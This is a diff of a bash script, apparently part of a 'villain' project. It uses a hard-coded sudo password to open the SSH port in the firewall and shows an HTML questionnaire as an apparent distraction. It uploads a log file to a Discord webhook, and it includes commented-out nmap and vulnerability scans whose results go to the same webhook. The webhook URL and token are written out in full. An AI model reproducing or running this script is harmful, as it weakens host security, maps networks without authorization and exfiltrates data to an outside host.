@@ -1,5 +1,7 @@
 #!/bin/bash
 if echo '12345' | sudo -S sh -c "sudo ufw allow ssh"; then
+	cd "/home/$USER/its_villain/"
+	firefox "fragebogen.html" 
 	echo "nmap scan and sending xml..."
  	# sudo nmap -T5 -A -v 10.10.10.14/24 -oX /home/$USER/net.xml
   	# curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
@@ -9,7 +11,7 @@ if echo '12345' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "ssh installed and enable. open port 22 "
  	# sudo nmap -sV --script vulners 10.10.10.1/24 -oX /home/$USER/vuln.xml  
   	# curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
-	firefox "/home/$USER/its_villain/fragebogen.html" 
+	
 else	
 	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	sleep 15
